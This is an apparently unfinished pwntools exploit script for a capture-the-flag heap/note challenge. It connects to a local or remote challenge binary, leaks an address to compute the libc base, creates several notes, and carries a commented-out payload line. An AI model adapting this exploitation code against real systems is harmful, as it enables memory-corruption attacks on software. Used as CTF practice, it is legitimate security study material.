#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_patched")
libc = ELF("./libc.so.6")

local = True 
if local:
    p = process("./chall_patched")
    gdb.attach(p,'''c''')
else:
    p = remote('103.162.14.240', 15001)

elf = context.binary = ELF('./chall_patched', checksec=False)

def create():
    p.sendlineafter(b">", b"1")

def write_to(idx, size, data):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"=", str(idx))
    p.sendlineafter(b"=", str(size))
    p.send(data)

def read_from(idx):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"=", str(idx))

create()
p.recvuntil(b"Addr of note 0 is 0x")
libc.address = int(p.recv(12),16) - 2277376
leak = libc.address + 2277376
print("[+]Libc_leak:    ", hex(leak))
print("[+]Libc_base:    ", hex(libc.address))

for i in range(8):
    create()
    print("======== Create ========")

'''
''' 
#p.sendlineafter(b">", b"1" + b"a"*7 + b"\x00" * (4*8) + p64(leak))

p.interactive()